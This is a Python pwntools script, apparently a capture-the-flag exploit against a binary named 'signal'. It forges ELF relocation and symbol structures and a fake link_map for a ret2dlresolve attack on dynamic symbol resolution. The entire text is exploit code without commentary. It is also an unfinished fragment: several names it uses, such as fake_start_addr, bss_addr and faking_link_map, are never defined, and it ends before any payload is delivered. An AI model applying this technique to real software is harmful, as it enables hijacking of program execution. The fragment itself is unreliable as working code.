from pwn import *

pelf = ELF("signal")

def fake_Elf64_RELA():
    r_offset = p64(pelf.got['read'])
    temp = ((fake_start_addr + align_padding + 24) - addr_dynsym)
    if (temp % 24) != 0:
          log.debug(temp % 24)
          log.error("div error.....")
    r_info = temp / 24
    r_info = p64((r_info << 32) | 0x7)
    r_addend = p64(0)
    return r_offset + r_info + r_addend


def fake_Elf64_Sym():
    st_name = p32((fake_start_addr + align_padding + 24 + 24) - addr_dynstr)
    return st_name + p32(0x12) + p64(0) + p64(0)

results = fake_Elf64_RELA() + fake_Elf64_Sym()

cmd_args = bss_addr + 6 * 8 + 256 + 16 + 24 + 16
link_map_addr = bss_addr + 8 * 6
rel_offset = 0
fake_link_map = faking_link_map()

fake_rela = fake_Elf64_RELA()

fake_rela_addr = bss_addr + 6 * 8 + 256 + 16

fake_sym_addr = pelf.got["__libc_start_main"] - 8